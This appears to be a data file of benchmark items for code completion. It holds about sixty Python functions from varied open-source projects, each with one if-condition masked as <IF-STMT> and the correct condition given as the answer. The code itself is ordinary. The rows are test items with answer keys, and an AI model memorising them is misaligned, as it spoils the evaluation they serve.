3579,"def make_sales_return_records():<tab><IF-STMT><tab><tab>for data in frappe.get_all(<tab><tab><tab>""Delivery Note"", fields=[""name""], filters={""docstatus"": 1}<tab><tab>):<tab><tab><tab>if random.random() < 0.1:<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>dn = make_sales_return(data.name)<tab><tab><tab><tab><tab>dn.insert()<tab><tab><tab><tab><tab>dn.submit()<tab><tab><tab><tab><tab>frappe.db.commit()<tab><tab><tab><tab>except Exception:<tab><tab><tab><tab><tab>frappe.db.rollback()",if random . random ( ) < 0.1 :,154
3580,"def getStatusString(self):<tab>if not self._isAvailable:<tab><tab>return ""Doodle3D box not found""<tab>if self._printing:<tab><tab><IF-STMT><tab><tab><tab>ret = ""Sending GCode: %.1f%%"" % (<tab><tab><tab><tab>float(self._blockIndex) * 100.0 / float(len(self._fileBlocks))<tab><tab><tab>)<tab><tab>elif len(self._fileBlocks) > 0:<tab><tab><tab>ret = ""Finished sending GCode to Doodle3D box.""<tab><tab>else:<tab><tab><tab>ret = ""Different print still running...""<tab><tab># ret += ""\nErrorCount: %d"" % (self._errorCount)<tab><tab>return ret<tab>return ""Printer found, waiting for print command.""",if self . _blockIndex < len ( self . _fileBlocks ) :,190
3581,"def coro(*args, **kw):<tab>res = func(*args, **kw)<tab>if isinstance(res, futures.Future) or inspect.isgenerator(res):<tab><tab>res = yield from res<tab>elif _AwaitableABC is not None:<tab><tab># If 'func' returns an Awaitable (new in 3.5) we<tab><tab># want to run it.<tab><tab>try:<tab><tab><tab>await_meth = res.__await__<tab><tab>except AttributeError:<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>res = yield from await_meth()<tab>return res","if isinstance ( res , _AwaitableABC ) :",148
3582,def _skip_to_next_iteration_group(self):<tab>while True:<tab><tab>if self._currkey is self._marker:<tab><tab><tab>pass<tab><tab>elif self._tgtkey is self._marker:<tab><tab><tab>break<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>newvalue = next(self._iterator)<tab><tab>if self._keyfunc is None:<tab><tab><tab>newkey = newvalue<tab><tab>else:<tab><tab><tab>newkey = self._keyfunc(newvalue)<tab><tab>self._currkey = newkey<tab><tab>self._currvalue = newvalue,if not self . _tgtkey == self . _currkey :,153
3583,"def in_quadview(context):<tab>for area in context.window.screen.areas:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>for space in area.spaces:<tab><tab><tab>if space.type != ""VIEW_3D"":<tab><tab><tab><tab>continue<tab><tab><tab>if len(space.region_quadviews) > 0:<tab><tab><tab><tab>return True<tab>return False","if area . type != ""VIEW_3D"" :",100
3584,"def find_from_pythonpath(name):<tab>for dirpath in sys.path:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>path = os.path.join(dirpath, name)<tab><tab>if os.path.isfile(path):<tab><tab><tab>return path<tab>return None",if not os . path . isdir ( dirpath ) :,75
3585,"def detailed_exceptions_wrapper(self, *args, **kwargs):<tab>try:<tab><tab>return meth(self, *args, **kwargs)<tab>except ScriptError as e:<tab><tab>info = e.args[0]<tab><tab><IF-STMT><tab><tab><tab>raise<tab><tab>info.setdefault(""type"", ScriptError.SPLASH_LUA_ERROR)<tab><tab>info.setdefault(""splash_method"", _name)<tab><tab>raise e","if not isinstance ( info , dict ) :",109
3586,"def metadata(draft):<tab>test_metadata = {}<tab>json_schema = create_jsonschema_from_metaschema(draft.registration_schema.schema)<tab>for key, value in json_schema[""properties""].items():<tab><tab>response = ""Test response""<tab><tab>items = value[""properties""][""value""].get(""items"")<tab><tab>enum = value[""properties""][""value""].get(""enum"")<tab><tab>if items:  # multiselect<tab><tab><tab>response = [items[""enum""][0]]<tab><tab>elif enum:  # singleselect<tab><tab><tab>response = enum[0]<tab><tab><IF-STMT><tab><tab><tab>response = {""question"": {""value"": ""Test Response""}}<tab><tab>test_metadata[key] = {""value"": response}<tab>return test_metadata","elif value [ ""properties"" ] [ ""value"" ] . get ( ""properties"" ) :",185
3587,"def separate_keys(self, keys, torrent_ids):<tab>""""""Separates the input keys into torrent class keys and plugins keys""""""<tab>if self.torrents:<tab><tab>for torrent_id in torrent_ids:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>status_keys = list(self.torrents[torrent_id].status_funcs)<tab><tab><tab><tab>leftover_keys = list(set(keys) - set(status_keys))<tab><tab><tab><tab>torrent_keys = list(set(keys) - set(leftover_keys))<tab><tab><tab><tab>return torrent_keys, leftover_keys<tab>return [], []",if torrent_id in self . torrents :,164
3588,"def upgrade():<tab>bind = op.get_bind()<tab>op.add_column(""slices"", sa.Column(""datasource_id"", sa.Integer()))<tab>session = db.Session(bind=bind)<tab>for slc in session.query(Slice).all():<tab><tab>if slc.druid_datasource_id:<tab><tab><tab>slc.datasource_id = slc.druid_datasource_id<tab><tab><IF-STMT><tab><tab><tab>slc.datasource_id = slc.table_id<tab><tab>session.merge(slc)<tab><tab>session.commit()<tab>session.close()",if slc . table_id :,139
3589,"def __call__(self, controller, environ, context):<tab>context.session = session = SessionObject(environ, **self.options)<tab>environ[""beaker.session""] = session<tab>environ[""beaker.get_session""] = self._get_session<tab>if ""paste.testing_variables"" in environ:<tab><tab>environ[""paste.testing_variables""][""session""] = session<tab>response = self.next_handler(controller, environ, context)<tab>if session.accessed():<tab><tab>session.persist()<tab><tab>session_headers = session.__dict__[""_headers""]<tab><tab>if session_headers[""set_cookie""]:<tab><tab><tab>cookie = session_headers[""cookie_out""]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>response.headers.extend(((""Set-cookie"", cookie),))<tab>return response",if cookie :,187
3590,"def propagate(self, user, change_action=None, author=None):<tab>""""""Propagate current translation to all others.""""""<tab>result = False<tab>for unit in self.same_source_units:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if unit.target == self.target and unit.state == self.state:<tab><tab><tab>continue<tab><tab>unit.target = self.target<tab><tab>unit.state = self.state<tab><tab>unit.save_backend(<tab><tab><tab>user,<tab><tab><tab>False,<tab><tab><tab>change_action=change_action,<tab><tab><tab>author=None,<tab><tab><tab>run_checks=False,<tab><tab>)<tab><tab>result = True<tab>return result","if not user . has_perm ( ""unit.edit"" , unit ) :",179
3591,"def load_model(self, model_dict):<tab>model_param = None<tab>model_meta = None<tab>for _, value in model_dict[""model""].items():<tab><tab>for model in value:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>model_meta = value[model]<tab><tab><tab>if model.endswith(""Param""):<tab><tab><tab><tab>model_param = value[model]<tab>LOGGER.info(""load model"")<tab>self.set_model_meta(model_meta)<tab>self.set_model_param(model_param)<tab>self.phi = np.array([model_param.phi_a])","if model . endswith ( ""Meta"" ) :",152
3592,"def name(self):<tab>""""""Get the enumeration name of this storage class.""""""<tab>if self._name_map is None:<tab><tab>self._name_map = {}<tab><tab>for key, value in StorageClass.__dict__.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._name_map[value] = key<tab>return self._name_map[self]","if isinstance ( value , StorageClass ) :",93
3593,"def relro(self):<tab>try:<tab><tab>gnu_relro = lief.ELF.SEGMENT_TYPES.GNU_RELRO<tab><tab>flags = lief.ELF.DYNAMIC_TAGS.FLAGS<tab><tab>bind_now = lief.ELF.DYNAMIC_FLAGS.BIND_NOW<tab><tab>if self.elf.get(gnu_relro):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return ""Full RELRO""<tab><tab><tab>else:<tab><tab><tab><tab>return ""Partial RELRO""<tab><tab>return ""No RELRO""<tab>except lief.not_found:<tab><tab>return ""No RELRO""",if bind_now in self . elf . get ( flags ) :,167
3594,"def test_counter_instantiation(self):<tab>self.assertIs(type(typing_extensions.Counter()), collections.Counter)<tab>self.assertIs(type(typing_extensions.Counter[T]()), collections.Counter)<tab>self.assertIs(type(typing_extensions.Counter[int]()), collections.Counter)<tab>class C(typing_extensions.Counter[T]):<tab><tab>...<tab>if TYPING_3_5_3:<tab><tab>self.assertIs(type(C[int]()), C)<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(C.__bases__, (typing_extensions.Counter,))<tab><tab>else:<tab><tab><tab>self.assertEqual(C.__bases__, (collections.Counter, typing.Generic))",if not PEP_560 :,171
3595,"def handle_exception(self, e, result):<tab>for k in sorted(result.thrift_spec):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>_, exc_name, exc_cls, _ = result.thrift_spec[k]<tab><tab>if isinstance(e, exc_cls):<tab><tab><tab>setattr(result, exc_name, e)<tab><tab><tab>return True<tab>return False","if result . thrift_spec [ k ] [ 1 ] == ""success"" :",112
3596,"def find_from_pythonpath(name):<tab>for dirpath in sys.path:<tab><tab>if not os.path.isdir(dirpath):<tab><tab><tab>continue<tab><tab>path = os.path.join(dirpath, name)<tab><tab><IF-STMT><tab><tab><tab>return path<tab>return None",if os . path . isfile ( path ) :,75
3597,"def parse_location(srclocation):<tab>loc = symbols.Location(<tab><tab>get_value(srclocation, ""file""), get_value(srclocation, ""project"")<tab>)<tab><IF-STMT><tab><tab>loc = symbols.InstalledLocation(<tab><tab><tab>symbols.parse_package(get_value(srclocation, ""package"")),<tab><tab><tab>parse_package_db(get_value(srclocation, ""db"")),<tab><tab>)<tab><tab>if loc.is_null():<tab><tab><tab>loc = symbols.OtherLocation(get_value(srclocation, ""source""))<tab>return loc if not loc.is_null() else None",if loc . is_null ( ) :,151
3598,"def execute(self):<tab>logger.debug(f""host {self.host} try ports: {default_ports}"")<tab>for single_port in default_ports:<tab><tab><IF-STMT><tab><tab><tab>logger.debug(f""Reachable port found: {single_port}"")<tab><tab><tab>self.publish_event(OpenPortEvent(port=single_port))","if self . test_connection ( self . host , single_port ) :",98
3599,"def get_dynamic_incoming_outgoing_rate(self, sle):<tab># Get updated incoming/outgoing rate from transaction<tab>if sle.recalculate_rate:<tab><tab>rate = self.get_incoming_outgoing_rate_from_transaction(sle)<tab><tab><IF-STMT><tab><tab><tab>sle.incoming_rate = rate<tab><tab>else:<tab><tab><tab>sle.outgoing_rate = rate",if flt ( sle . actual_qty ) >= 0 :,106
3600,"def _naf(mult):<tab>""""""Calculate non-adjacent form of number.""""""<tab>ret = []<tab>while mult:<tab><tab><IF-STMT><tab><tab><tab>nd = mult % 4<tab><tab><tab>if nd >= 2:<tab><tab><tab><tab>nd = nd - 4<tab><tab><tab>ret += [nd]<tab><tab><tab>mult -= nd<tab><tab>else:<tab><tab><tab>ret += [0]<tab><tab>mult //= 2<tab>return ret",if mult % 2 :,107
3601,"def indent_xml(elem, level=0):<tab>""""""Do our pretty printing and make Matt very happy.""""""<tab>i = ""\n"" + level * ""  ""<tab>if elem:<tab><tab><IF-STMT><tab><tab><tab>elem.text = i + ""  ""<tab><tab>if not elem.tail or not elem.tail.strip():<tab><tab><tab>elem.tail = i<tab><tab>for elem in elem:<tab><tab><tab>indent_xml(elem, level + 1)<tab><tab>if not elem.tail or not elem.tail.strip():<tab><tab><tab>elem.tail = i<tab>else:<tab><tab>if level and (not elem.tail or not elem.tail.strip()):<tab><tab><tab>elem.tail = i",if not elem . text or not elem . text . strip ( ) :,177
3602,def clockface(radius):<tab>reset()<tab>pensize(7)<tab>for i in range(60):<tab><tab>jump(radius)<tab><tab><IF-STMT><tab><tab><tab>fd(25)<tab><tab><tab>jump(-radius - 25)<tab><tab>else:<tab><tab><tab>dot(3)<tab><tab><tab>jump(-radius)<tab><tab>rt(6),if i % 5 == 0 :,90
3603,"def OnTextEntered(self, evt):<tab>text = self.GetValue()<tab>if self.doSearch(text):<tab><tab>self.searches.append(text)<tab><tab><IF-STMT><tab><tab><tab>del self.searches[0]<tab><tab>self.SetMenu(self.MakeMenu())<tab>self.SetValue("""")",if len ( self . searches ) > self . maxSearches :,89
3604,"def wrapped_send(bot, location, content=None, preprocessor=None, **kwargs):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>content = await preprocessor(bot, location, content)<tab><tab>await location.send(content, **kwargs)<tab>except Exception as _exc:<tab><tab>main_log.error(<tab><tab><tab>""I could not send an owner notification to %s (%s)"",<tab><tab><tab>location,<tab><tab><tab>location.id,<tab><tab><tab>exc_info=_exc,<tab><tab>)",if preprocessor is not None :,125
3605,"def explode(self, obj):<tab>""""""Determine if the object should be exploded.""""""<tab>if obj in self._done:<tab><tab>return False<tab>result = False<tab>for item in self._explode:<tab><tab><IF-STMT><tab><tab><tab># If it has a _moId it is an instance<tab><tab><tab>if obj._moId == item._moId:<tab><tab><tab><tab>result = True<tab><tab>else:<tab><tab><tab># If it does not have a _moId it is a template<tab><tab><tab>if obj.__class__.__name__ == item.__name__:<tab><tab><tab><tab>result = True<tab>if result:<tab><tab>self._done.add(obj)<tab>return result","if hasattr ( item , ""_moId"" ) :",166
3606,"def _verify_treestore(itr, tree_values):<tab>i = 0<tab>while itr:<tab><tab>values = tree_values[i]<tab><tab>if treestore[itr][0] != values[0]:<tab><tab><tab>return False<tab><tab><IF-STMT><tab><tab><tab>if not _verify_treestore(treestore.iter_children(itr), values[1]):<tab><tab><tab><tab>return False<tab><tab>itr = treestore.iter_next(itr)<tab><tab>i += 1<tab>return True",if treestore . iter_children ( itr ) :,132
3607,"def types(model_cls):<tab># Gives us `item_types` and `album_types`<tab>attr_name = ""{0}_types"".format(model_cls.__name__.lower())<tab>types = {}<tab>for plugin in find_plugins():<tab><tab>plugin_types = getattr(plugin, attr_name, {})<tab><tab>for field in plugin_types:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise PluginConflictException(<tab><tab><tab><tab><tab>u""Plugin {0} defines flexible field {1} ""<tab><tab><tab><tab><tab>u""which has already been defined with ""<tab><tab><tab><tab><tab>u""another type."".format(plugin.name, field)<tab><tab><tab><tab>)<tab><tab>types.update(plugin_types)<tab>return types",if field in types and plugin_types [ field ] != types [ field ] :,189
3608,"def set_origin(self, origin):<tab># This is useful to modify an exception to add origin information as<tab># it ""passes by"", without losing traceback information. (In Python 3<tab># we can use the built-in exception wrapping stuff, but it will be<tab># some time before we can count on that...)<tab>if self.origin is None:<tab><tab><IF-STMT><tab><tab><tab>origin = origin.origin<tab><tab>if not isinstance(origin, patsy.origin.Origin):<tab><tab><tab>origin = None<tab><tab>self.origin = origin","if hasattr ( origin , ""origin"" ) :",132
3609,"def items(self):<tab>if self._items is not None:<tab><tab>return self._items<tab>items = self.get_option(""recent-connections"")<tab>if not items:<tab><tab>self._items = []<tab><tab>return self._items<tab>for i in reversed(items):<tab><tab><IF-STMT><tab><tab><tab>items.remove(i)<tab><tab>try:<tab><tab><tab>i[""device""] = self.get_device_path(i)<tab><tab>except AdapterNotFound:<tab><tab><tab>i[""device""] = None<tab><tab>except DeviceNotFound:<tab><tab><tab>items.remove(i)<tab><tab>i[""time""] = float(i[""time""])<tab>self._items = items<tab>return self._items","if ""name"" not in i or ""uuid"" not in i :",181
3610,"def test_doc_attributes(self):<tab>print_test_name(""TEST DOC ATTRIBUTES"")<tab>correct = 0<tab>for example in DOC_EXAMPLES:<tab><tab>original_schema = schema.parse(example.schema_string)<tab><tab>if original_schema.doc is not None:<tab><tab><tab>correct += 1<tab><tab>if original_schema.type == ""record"":<tab><tab><tab>for f in original_schema.fields:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.fail(<tab><tab><tab><tab><tab><tab>""Failed to preserve 'doc' in fields: "" + example.schema_string<tab><tab><tab><tab><tab>)<tab>self.assertEqual(correct, len(DOC_EXAMPLES))",if f . doc is None :,168
3611,"def StopBackgroundWorkload(self):<tab>""""""Stop the background workoad.""""""<tab>for workload in background_workload.BACKGROUND_WORKLOADS:<tab><tab><IF-STMT><tab><tab><tab>if self.OS_TYPE in workload.EXCLUDED_OS_TYPES:<tab><tab><tab><tab>raise NotImplementedError()<tab><tab><tab>workload.Stop(self)",if workload . IsEnabled ( self ) :,87
3612,"def resolve_expression(<tab>self, query=None, allow_joins=True, reuse=None, summarize=False, for_save=False):<tab>resolved = super(SearchQuery, self).resolve_expression(<tab><tab>query, allow_joins, reuse, summarize, for_save<tab>)<tab>if self.config:<tab><tab><IF-STMT><tab><tab><tab>resolved.config = Value(self.config).resolve_expression(<tab><tab><tab><tab>query, allow_joins, reuse, summarize, for_save<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>resolved.config = self.config.resolve_expression(<tab><tab><tab><tab>query, allow_joins, reuse, summarize, for_save<tab><tab><tab>)<tab>return resolved","if not hasattr ( self . config , ""resolve_expression"" ) :",179
3613,"def resolve_ip(filename, foffset, ip, need_line):<tab>sym, soffset, line = None, 0, None<tab>if filename and filename.startswith(""/""):<tab><tab>sym, soffset = resolve_sym(filename, foffset)<tab><tab>if not sym:<tab><tab><tab>sym, soffset = resolve_sym(filename, ip)<tab><tab><IF-STMT><tab><tab><tab>line = resolve_line(filename, ip)<tab>else:<tab><tab>sym, soffset = kernel.resolve_kernel(ip)<tab>return sym, soffset, line",if need_line :,132
3614,"def create_model(self, dataset, weight_name=Checkpoint._LATEST):<tab>if not self.is_empty:<tab><tab>run_config = copy.deepcopy(self._checkpoint.run_config)<tab><tab>model = instantiate_model(run_config, dataset)<tab><tab><IF-STMT><tab><tab><tab>for k, v in self._checkpoint.model_props.items():<tab><tab><tab><tab>setattr(model, k, v)<tab><tab><tab>delattr(self._checkpoint, ""model_props"")<tab><tab>self._initialize_model(model, weight_name)<tab><tab>return model<tab>else:<tab><tab>raise ValueError(""Checkpoint is empty"")","if hasattr ( self . _checkpoint , ""model_props"" ) :",160
3615,"def get_py2exe_datafiles():<tab>datapath = get_data_path()<tab>head, tail = os.path.split(datapath)<tab>d = {}<tab>for root, dirs, files in os.walk(datapath):<tab><tab># Need to explicitly remove cocoa_agg files or py2exe complains<tab><tab># NOTE I dont know why, but do as previous version<tab><tab><IF-STMT><tab><tab><tab>files.remove(""Matplotlib.nib"")<tab><tab>files = [os.path.join(root, filename) for filename in files]<tab><tab>root = root.replace(tail, ""mpl-data"")<tab><tab>root = root[root.index(""mpl-data"") :]<tab><tab>d[root] = files<tab>return d.items()","if ""Matplotlib.nib"" in files :",187
3616,"def mouseClickEvent(self, ev):<tab>if ev.button() == QtCore.Qt.LeftButton and self.allowAdd:<tab><tab>pos = ev.pos()<tab><tab>if pos.x() < 0 or pos.x() > self.length:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>pos.setX(min(max(pos.x(), 0), self.length))<tab><tab>self.addTick(pos.x() / self.length)<tab>elif ev.button() == QtCore.Qt.RightButton:<tab><tab>self.showMenu(ev)",if pos . y ( ) < 0 or pos . y ( ) > self . tickSize :,156
3617,"def image_preprocess(self, image):<tab>with tf.name_scope(""image_preprocess""):<tab><tab><IF-STMT><tab><tab><tab>image = tf.cast(image, tf.float32)<tab><tab>mean = [0.485, 0.456, 0.406]  # rgb<tab><tab>std = [0.229, 0.224, 0.225]<tab><tab>if self.image_bgr:<tab><tab><tab>mean = mean[::-1]<tab><tab><tab>std = std[::-1]<tab><tab>image_mean = tf.constant(mean, dtype=tf.float32) * 255.0<tab><tab>image_std = tf.constant(std, dtype=tf.float32) * 255.0<tab><tab>image = (image - image_mean) / image_std<tab><tab>return image",if image . dtype . base_dtype != tf . float32 :,195
3618,"def _addConsoleMessage(self, type: str, args: List[JSHandle]) -> None:<tab>if not self.listeners(Page.Events.Console):<tab><tab>for arg in args:<tab><tab><tab>self._client._loop.create_task(arg.dispose())<tab><tab>return<tab>textTokens = []<tab>for arg in args:<tab><tab>remoteObject = arg._remoteObject<tab><tab><IF-STMT><tab><tab><tab>textTokens.append(arg.toString())<tab><tab>else:<tab><tab><tab>textTokens.append(str(helper.valueFromRemoteObject(remoteObject)))<tab>message = ConsoleMessage(type, "" "".join(textTokens), args)<tab>self.emit(Page.Events.Console, message)","if remoteObject . get ( ""objectId"" ) :",176
3619,"def _handle_guild_scalar(self, add_scalar, _tag, _value, step=None):<tab>""""""Handler for guild.summary.SummaryWriter.add_scalar.""""""<tab>vals = self._summary_values(step)<tab>if vals:<tab><tab>self.log.debug(""summary values via add_scalar: %s"", vals)<tab><tab>for tag, val in vals.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>add_scalar(tag, val, step)",if val is not None :,118
3620,"def _get_token_from_cookie(self):<tab>for cookie in self.session.cookies:<tab><tab>if cookie.name == ""X-APPLE-WEBAUTH-VALIDATE"":<tab><tab><tab>match = search(r""\bt=([^:]+)"", cookie.value)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise Exception(""Can't extract token from %r"" % cookie.value)<tab><tab><tab>return {""token"": match.group(1)}<tab>raise Exception(""Token cookie not found"")",if match is None :,117
3621,"def unpack_RK(rk_str):<tab>flags = BYTES_ORD(rk_str[0])<tab>if flags & 2:<tab><tab># There's a SIGNED 30-bit integer in there!<tab><tab>(i,) = unpack(""<i"", rk_str)<tab><tab>i >>= 2  # div by 4 to drop the 2 flag bits<tab><tab><IF-STMT><tab><tab><tab>return i / 100.0<tab><tab>return float(i)<tab>else:<tab><tab># It's the most significant 30 bits of an IEEE 754 64-bit FP number<tab><tab>(d,) = unpack(""<d"", b""\0\0\0\0"" + BYTES_LITERAL(chr(flags & 252)) + rk_str[1:4])<tab><tab>if flags & 1:<tab><tab><tab>return d / 100.0<tab><tab>return d",if flags & 1 :,200
3622,"def _parse_photo(self):<tab>cat = ""lib""<tab>for photosection in self.plex.library.sections():<tab><tab><IF-STMT><tab><tab><tab>self._load_attrs(photosection, cat)<tab><tab><tab>for photoalbum in photosection.all():<tab><tab><tab><tab>self._load_attrs(photoalbum, cat)<tab><tab><tab><tab>for photo in photoalbum.photos():<tab><tab><tab><tab><tab>self._load_attrs(photo, cat)",if photosection . TYPE == library . PhotoSection . TYPE :,130
3623,"def count(num):<tab>cnt = 0<tab>for i in range(num):<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError<tab><tab><tab>if i % 3:<tab><tab><tab><tab>raise ArithmeticError(""1"")<tab><tab>except Exception as e:<tab><tab><tab>cnt += 1<tab>return cnt",if i % 2 :,80
3624,"def node_exists(self, jid=None, node=None, ifrom=None):<tab>with self.lock:<tab><tab><IF-STMT><tab><tab><tab>jid = self.xmpp.boundjid.full<tab><tab>if node is None:<tab><tab><tab>node = """"<tab><tab>if ifrom is None:<tab><tab><tab>ifrom = """"<tab><tab>if isinstance(ifrom, JID):<tab><tab><tab>ifrom = ifrom.full<tab><tab>if (jid, node, ifrom) not in self.nodes:<tab><tab><tab>return False<tab><tab>return True",if jid is None :,136
3625,"def __call__(self, environ, start_response):<tab>script_name = environ.get(""HTTP_X_SCRIPT_NAME"")<tab>if script_name is not None:<tab><tab><IF-STMT><tab><tab><tab>warnings.warn(<tab><tab><tab><tab>""'X-Script-Name' header should not end in '/' (found: %r). ""<tab><tab><tab><tab>""Please fix your proxy's configuration."" % script_name<tab><tab><tab>)<tab><tab><tab>script_name = script_name.rstrip(""/"")<tab><tab>environ[""SCRIPT_NAME""] = script_name<tab>return super(ProxyFix, self).__call__(environ, start_response)","if script_name . endswith ( ""/"" ) :",151
3626,"def backwardKillParagraph(self, event):<tab>""""""Kill the previous paragraph.""""""<tab>c = self.c<tab>w = self.editWidget(event)<tab>if not w:<tab><tab>return<tab>self.beginCommand(w, undoType=""backward-kill-paragraph"")<tab>try:<tab><tab>self.backwardParagraphHelper(event, extend=True)<tab><tab>i, j = w.getSelectionRange()<tab><tab><IF-STMT><tab><tab><tab>i = min(i + 1, j)<tab><tab>c.killBufferCommands.kill(<tab><tab><tab>event, i, j, force=True, undoType=None  # Use i, j without change.<tab><tab>)<tab><tab>w.setSelectionRange(i, i, insert=i)<tab>finally:<tab><tab>self.endCommand(changed=True, setLabel=True)",if i > 0 :,199
3627,"def bracket_replace(code):<tab>new = """"<tab>for e in bracket_split(code, [""()"", ""[]""], False):<tab><tab>if e[0] == ""["":<tab><tab><tab>name = ""#PYJSREPL"" + str(len(REPL)) + ""{""<tab><tab><tab>new += name<tab><tab><tab>REPL[name] = e<tab><tab><IF-STMT>  # can be a function call<tab><tab><tab>name = ""@PYJSREPL"" + str(len(REPL)) + ""}""<tab><tab><tab>new += name<tab><tab><tab>REPL[name] = e<tab><tab>else:<tab><tab><tab>new += e<tab>return new","elif e [ 0 ] == ""("" :",154
3628,"def regenerate(self, request, **kwargs):<tab>obj = self.get_object()<tab>if ""all"" in request.data:<tab><tab>for user in User.objects.all():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>token = Token.objects.get(user=user)<tab><tab><tab><tab>token.delete()<tab><tab><tab><tab>Token.objects.create(user=user)<tab><tab>return Response("""")<tab>if ""username"" in request.data:<tab><tab>obj = get_object_or_404(User, username=request.data[""username""])<tab><tab>self.check_object_permissions(self.request, obj)<tab>token = Token.objects.get(user=obj)<tab>token.delete()<tab>token = Token.objects.create(user=obj)<tab>return Response({""token"": token.key})",if not user . is_anonymous ( ) :,200
3629,"def signal_notebook_switch_page(self, notebook, current_page, index):<tab>if not hasattr(self.parent, ""rpc""):<tab><tab>return<tab># previous_page = notebook.get_nth_page(self.last_page_id)<tab>self.last_page_id = index<tab>for tab in self.tabs.values():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if hasattr(tab, ""load_campaign_information""):<tab><tab><tab>tab.load_campaign_information(force=False)",if current_page != tab . box :,137
3630,"def get_word_parens_range(self, offset, opening=""("", closing="")""):<tab>end = self._find_word_end(offset)<tab>start_parens = self.code.index(opening, end)<tab>index = start_parens<tab>open_count = 0<tab>while index < len(self.code):<tab><tab><IF-STMT><tab><tab><tab>open_count += 1<tab><tab>if self.code[index] == closing:<tab><tab><tab>open_count -= 1<tab><tab>if open_count == 0:<tab><tab><tab>return (start_parens, index + 1)<tab><tab>index += 1<tab>return (start_parens, index)",if self . code [ index ] == opening :,160
3631,"def append(self, child):<tab>if child not in (None, self):<tab><tab>tag = child_tag(self._tag)<tab><tab>if tag:<tab><tab><tab>if isinstance(child, Html):<tab><tab><tab><tab>if child.tag != tag:<tab><tab><tab><tab><tab>child = Html(tag, child)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>child = Html(tag, child)<tab><tab>super().append(child)","elif not child . startswith ( ""<%s"" % tag ) :",113
3632,"def cvPreprocess():<tab>import cv2<tab>imgarr_orig = []<tab>image_ext_list = ["".jpg"", "".png"", "".JPEG"", "".jpeg"", "".PNG"", "".JPG""]<tab>for file in onlyfiles:<tab><tab>fimg = imgroot + file<tab><tab><IF-STMT><tab><tab><tab>print(fimg + "" is not an image file"")<tab><tab><tab>continue<tab><tab>img1 = cv2.imread(fimg)<tab><tab>if img1 is None:<tab><tab><tab>print(""ERROR opening "", fimg)<tab><tab><tab>continue<tab><tab>img1 = cv2.resize(img1, (896, 896))<tab><tab>imgarr_orig.append(img1)<tab>return imgarr_orig",if any ( [ x in image_ext_list for x in fimg ] ) :,187
3633,"def replace_nodes_in_symbol_table(<tab>symbols: SymbolTable, replacements: Dict[SymbolNode, SymbolNode]) -> None:<tab>for name, node in symbols.items():<tab><tab><IF-STMT><tab><tab><tab>if node.node in replacements:<tab><tab><tab><tab>new = replacements[node.node]<tab><tab><tab><tab>old = node.node<tab><tab><tab><tab>replace_object_state(new, old)<tab><tab><tab><tab>node.node = new<tab><tab><tab>if isinstance(node.node, (Var, TypeAlias)):<tab><tab><tab><tab># Handle them here just in case these aren't exposed through the AST.<tab><tab><tab><tab>node.node.accept(NodeReplaceVisitor(replacements))",if node . node :,161
3634,"def __find_audio_offset(self, fileobj):<tab>byte = 0x00<tab>while not (byte & 0x80):<tab><tab>byte = ord(fileobj.read(1))<tab><tab>size = to_int_be(fileobj.read(3))<tab><tab>try:<tab><tab><tab>block_type = self.METADATA_BLOCKS[byte & 0x7F]<tab><tab>except IndexError:<tab><tab><tab>block_type = None<tab><tab><IF-STMT><tab><tab><tab># See comments in read_metadata_block; the size can't<tab><tab><tab># be trusted for Vorbis comment blocks and Picture block<tab><tab><tab>block_type(fileobj)<tab><tab>else:<tab><tab><tab>fileobj.read(size)<tab>return fileobj.tell()",if block_type and block_type . _distrust_size :,190
3635,"def startJail(self, name):<tab>with self.__lock:<tab><tab>jail = self.__jails[name]<tab><tab><IF-STMT><tab><tab><tab>jail.start()<tab><tab>elif name in self.__reload_state:<tab><tab><tab>logSys.info(""Jail %r reloaded"", name)<tab><tab><tab>del self.__reload_state[name]<tab><tab>if jail.idle:<tab><tab><tab>jail.idle = False",if not jail . isAlive ( ) :,111
3636,def get_resolved_dependencies(self):<tab>dependencies = []<tab>for dependency in self.envconfig.deps:<tab><tab><IF-STMT><tab><tab><tab>package = resolve_package(package_spec=dependency.name)<tab><tab><tab>if package != dependency.name:<tab><tab><tab><tab>dependency = dependency.__class__(package)<tab><tab>dependencies.append(dependency)<tab>return dependencies,if dependency . indexserver is None :,93
3637,"def _compile(self):<tab>if not self._compiled:<tab><tab># special case match-all query<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>try:<tab><tab><tab>self._tokens = boolExpression.parseString(self._query, parseAll=self.strict)<tab><tab>except ParseException:<tab><tab><tab>raise<tab><tab>self._compiled = True",if self . _is_match_all ( ) :,92
3638,"def _compute_features(self, images):<tab>output_blobs = self._forward(images)<tab>features = []<tab>for blob in output_blobs:<tab><tab>blob = blob.reshape((blob.shape[0], blob.shape[1]))<tab><tab><IF-STMT><tab><tab><tab>blob = blob.max(0)<tab><tab>else:<tab><tab><tab>blob = self.merge(blob)<tab><tab>features.append(blob)<tab>return np.vstack(features)","if self . merge == ""max"" :",116
